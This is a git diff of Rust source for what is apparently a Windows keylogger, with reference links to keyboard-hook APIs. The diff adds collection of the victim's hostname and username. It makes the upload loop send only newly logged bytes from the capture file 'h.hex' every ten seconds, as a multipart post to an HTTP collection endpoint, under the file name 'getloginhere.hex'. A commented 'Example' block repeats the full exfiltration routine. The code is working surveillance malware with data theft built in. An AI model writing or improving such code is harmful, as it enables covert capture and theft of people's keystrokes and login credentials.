@@ -7,28 +7,43 @@ use windows::{
         Foundation::{
             HINSTANCE, WPARAM, LPARAM, LRESULT, HWND
         },
-        System::WindowsProgramming::GetUserNameW
+        System::{
+            WindowsProgramming::GetUserNameW,
+            SystemInformation::{GetComputerNameExW, COMPUTER_NAME_FORMAT} 
+        },
     },
     core::PWSTR
 };
 use std::{
     mem::transmute,
-    fs::OpenOptions,
-    io::{Read, Write},
+    io::{Read, Write, SeekFrom, prelude::Seek},
     thread::sleep,
     time::Duration,
     slice::from_raw_parts,
     usize,
-    fs::{File, metadata},
+    fs::{File, metadata, OpenOptions},
     thread::spawn
 };
 use serde_json::json;
 use reqwest::blocking::Client;
 use reqwest::blocking::multipart;
 
-// TODO: get hostname/mahcine name and
+//TOFIX: Do not send the whole file because why send the whole entire file? just send whats new using the same system
 //https://learn.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-getcomputernameexw
-//
+
+fn get_host_name() -> String {
+    let mut cb_buffer = 257_u32;
+    let mut buffer =  Vec::<u16>::with_capacity(cb_buffer as usize);
+    let lp_buffer = PWSTR(buffer.as_mut_ptr());
+
+    let status = unsafe {
+        GetComputerNameExW(COMPUTER_NAME_FORMAT(0), lp_buffer, &mut cb_buffer)
+    };
+
+    if status.is_err() {return "Error".into()}
+
+    return String::from_utf16_lossy(unsafe{std::slice::from_raw_parts(lp_buffer.0, cb_buffer as usize)})
+}
 
 fn get_current_user() -> String {
     let mut cb_buffer = 257_u32;
@@ -64,10 +79,12 @@ fn upload_file() {
 
             let mut file = File::open("h.hex").expect("Failed to open file");
             let mut content = Vec::new();
+
+            file.seek(SeekFrom::Start(last_file_size)).expect("Failed to set seek");
             file.read_to_end(&mut content).expect("Failed to read file");
 
             let json_data = json!({
-                "MachineName": "Desktop-GJDHJ21",
+                "MachineName": get_host_name(),
                 "Username": get_current_user()
             });
 
@@ -147,4 +164,65 @@ https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-dispatchm
 https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getmessagew
 https://stackoverflow.com/questions/75870904/how-to-correctly-set-a-wh-keyboard-hook-procedure-using-setwindowshookexw-in-rus
 https://learn.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms644984(v=vs.85)
+*/
+
+/*
+Example
+
+fn upload_file() {
+    let mut last_offset: u64 = 0;
+    loop {
+        sleep(Duration::from_secs(10));
+        let current_file_size = get_file_size("h.hex");
+
+        if current_file_size < last_offset {
+            // File has been truncated or replaced
+            println!("File has been deleted and a replacement has been created!");
+            last_offset = 0;
+        } else if current_file_size > last_offset {
+            // File size increased, new content available
+            let url = "http://127.0.0.1:8082/UploadFile";
+
+            let mut file = File::open("h.hex").expect("Failed to open file");
+            let mut content = Vec::new();
+
+            // Seek to the last offset
+            file.seek(SeekFrom::Start(last_offset)).expect("Failed to seek file");
+
+            // Read new content from the file
+            file.read_to_end(&mut content).expect("Failed to read file");
+
+            let json_data = json!({
+                "MachineName": get_host_name(),
+                "Username": get_current_user()
+            });
+
+            let client = reqwest::blocking::Client::new();
+
+            let form = multipart::Form::new()
+                .part(
+                    "file",
+                    Part::bytes(content)
+                        .file_name("getloginhere.hex")
+                        .mime_str("application/octet-stream")
+                        .unwrap(),
+                )
+                .part(
+                    "json_data",
+                    Part::text(serde_json::to_string(&json_data).unwrap())
+                        .mime_str("application/json")
+                        .unwrap(),
+                );
+
+            if let Ok(res) = client.post(url).multipart(form).send() {
+                println!("Response: {:?}", res);
+                // Update the last offset to the current file size
+                last_offset = current_file_size;
+            } else {
+                eprintln!("Failed to send request");
+            }
+        }
+    }
+}
+
 */
